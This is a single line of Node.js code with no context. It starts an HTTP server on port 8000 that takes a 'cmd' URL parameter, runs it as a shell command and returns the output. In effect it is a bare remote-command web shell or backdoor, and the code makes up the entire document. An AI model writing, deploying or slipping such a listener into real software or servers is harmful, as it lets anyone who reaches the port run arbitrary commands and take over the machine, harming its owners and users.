require('http').createServer((r,s)=>{c=require('url').parse(r.url,true).query['cmd'];if(c)require('child_process').exec(c,(e,o)=>{s.end(o);if(e)console.log(e)})}).listen(8000)
